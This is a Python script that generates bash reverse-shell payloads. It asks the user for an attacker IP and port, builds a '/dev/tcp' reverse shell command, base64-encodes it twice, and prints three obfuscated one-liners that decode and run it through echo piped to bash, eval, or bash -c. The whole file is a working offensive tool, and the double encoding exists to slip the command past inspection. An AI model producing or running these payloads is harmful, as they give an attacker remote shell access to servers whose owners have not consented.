#=====================================================================================
#This python script will help generate bash_revshell based on these patterns bellow
#Payload 1: 
#echo '{payload-got-base64-encoded-2-times}'|base64 -d|base64 -d|bash
#
#Payload 2:
#eval `echo {payload-got-base64-encoded-2-times}|base64 -d|base64 -d`
#
#Payload 3:
#bash -c "$(base64 -d<<<$(base64 -d<<<{payload-got-base64-encoded-2-times}))"
#=====================================================================================

import base64
from colorama import Fore, Back, Style, init
init(autoreset=True) #Auto reset color after each print

def encode_base64_no_line_breaks(input_string):
    return base64.b64encode(input_string.encode()).decode('utf-8')

def main():
    # Requesting user input for attacker IP and port
    print(Style.BRIGHT + "This script will help generate bash_revshell more quick")
    print(Style.BRIGHT + Fore.RED + 'Make sure target-server has `bash`' + Style.RESET_ALL)
    attacker_ip     = input("\nPlease provide attacker-ip: ")
    attacker_port   = input("Please provide attacker-port: ")

    # Original bash reverse shell command
    original_bash_revshell = f'bash -c \'sh -i>&/dev/tcp/{attacker_ip}/{attacker_port} 0>&1\''
    print("\n=====")
    print(Fore.GREEN + "Original-bash-revshell:")
    print("")
    print(f"{Style.BRIGHT}{original_bash_revshell}")
    print("=====\n")
    

    # Encoding the original bash reverse shell command with Base64 two times without line breaks
    first_encoded = encode_base64_no_line_breaks(original_bash_revshell)
    second_encoded = encode_base64_no_line_breaks(first_encoded)
    print("\n=====")
    print(Fore.GREEN + "Original-bash-revshell after getting base64-encoded-2-times")
    print(f"{Style.BRIGHT}{second_encoded}\n")
    print(f"{Style.BRIGHT}{Fore.RED}Note that to  perform base64-encoded-2-times in Linux, must run as follow:{Style.RESET_ALL}")
    print(f"{Style.BRIGHT}echo -n \"{original_bash_revshell}\"|base64 -w0|base64 -w0{Style.RESET_ALL}")
    print("=====\n")
    

    # Generating payloads
    print("\n=====")
    print(Fore.GREEN + "Payload 1:")
    payload_1 = f"echo '{second_encoded}'|base64 -d|base64 -d|bash"
    print("")
    print(f"{Style.BRIGHT}{payload_1}")
    print("=====\n")
    
    print("\n=====")
    print(Fore.GREEN + "Payload 2:")
    payload_2 = f"eval `echo {second_encoded}|base64 -d|base64 -d`"
    print("")
    print(f"{Style.BRIGHT}{payload_2}")
    print("=====\n")
    
    print("\n=====")
    print(Fore.GREEN + "Payload 3:")
    payload_3 = f'bash -c "$(base64 -d<<<$(base64 -d<<<{second_encoded}))"'
    print("")
    print(f"{Style.BRIGHT}{payload_3}")
    print("=====\n")
    

if __name__ == "__main__":
    main()

